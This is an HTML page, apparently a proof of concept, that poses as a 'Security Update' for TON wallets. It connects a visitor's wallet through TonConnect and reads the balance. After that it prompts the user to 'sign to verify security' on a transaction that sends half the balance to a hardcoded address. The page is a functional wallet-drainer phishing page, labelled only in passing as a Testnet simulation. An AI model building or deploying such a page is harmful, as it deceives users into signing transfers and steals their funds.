<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Web Security PoC</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0b0e11; 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            padding: 20px;
            box-sizing: border-box;
        }
        .card { 
            background: #1e2329; 
            padding: 30px; 
            border-radius: 24px; 
            border: 1px solid #333; 
            text-align: center; 
            width: 100%;
            max-width: 400px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
        }
        .balance-box { 
            display: none; 
            background: #000; 
            padding: 20px; 
            border-radius: 15px; 
            margin-top: 20px; 
            border: 1px solid #58a6ff; 
        }
        button { 
            background: #0088cc; 
            color: white; 
            border: none; 
            padding: 18px; 
            width: 100%; 
            border-radius: 12px; 
            font-weight: bold; 
            cursor: pointer; 
            font-size: 18px; 
            transition: 0.3s; 
        }
        button:hover { background: #0077b5; }
        #status { margin-top: 15px; color: #848e9c; font-size: 13px; }
        .addr-text { font-size: 10px; color: #aaa; word-break: break-all; margin-top: 5px;}
    </style>
</head>
<body>

<div class="card">
    <img src="https://ton.org/address/ton_logo.png" width="60" style="margin-bottom: 20px;">
    <h2>Security Update</h2>
    <p style="color: #aaa; font-size: 14px;">This page simulates an identity spoofing attack to drain Testnet balance.</p>
    
    <button id="connectBtn">Connect Wallet</button>

    <div id="balanceBox" class="balance-box">
        <div style="color: #58a6ff; font-size: 12px;">Connected Wallet:</div>
        <div id="addr" class="addr-text">-</div>
        <div style="font-size: 24px; margin-top: 15px; font-weight: bold;"><span id="balance">0.00</span> TON</div>
    </div>
    
    <div id="status">Ready to start...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/f190eaf3c994f471fd6e05c9a22b52e4540e7ff1/tonconnect-manifest.json";
    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    document.getElementById('connectBtn').onclick = async () => {
        try {
            if (connector.connected) await connector.disconnect();

            const connectUrl = connector.connect({
                universalLink: 'https://wallet.tonkeeper.com/ton-connect',
                bridgeUrl: 'https://bridge.tonapi.io/bridge'
            });

            window.open(connectUrl, '_blank', 'width=450,height=700');
            document.getElementById('status').innerText = "Waiting for approval in popup...";
        } catch (e) {
            console.error(e);
            document.getElementById('status').innerText = "Connection error.";
        }
    };

    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            document.getElementById('status').innerText = "âœ… Connected! Fetching balance...";
            const rawAddress = wallet.account.address;
            document.getElementById('addr').innerText = rawAddress;
            document.getElementById('balanceBox').style.display = 'block';

            try {
                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
                const data = await response.json();
                const balanceNano = data.result.balance;
                document.getElementById('balance').innerText = (balanceNano / 1000000000).toFixed(2);

                setTimeout(() => initiateDrain(balanceNano), 2500);
            } catch (e) { 
                document.getElementById('status').innerText = "Failed to fetch network balance.";
            }
        }
    });

    async function initiateDrain(nanoAmount) {
        if (nanoAmount <= 0) return;
        
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 120,
            messages: [{
                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY",
                amount: Math.floor(nanoAmount * 0.50).toString()
            }]
        };

        try {
            document.getElementById('status').innerText = "Please sign to verify security...";
            await connector.sendTransaction(transaction);
            document.getElementById('status').innerText = "ðŸš€ Transaction Sent Successfully!";
        } catch (e) {
            document.getElementById('status').innerText = "Transaction failed or rejected.";
        }
    }
</script>
</body>
</html>
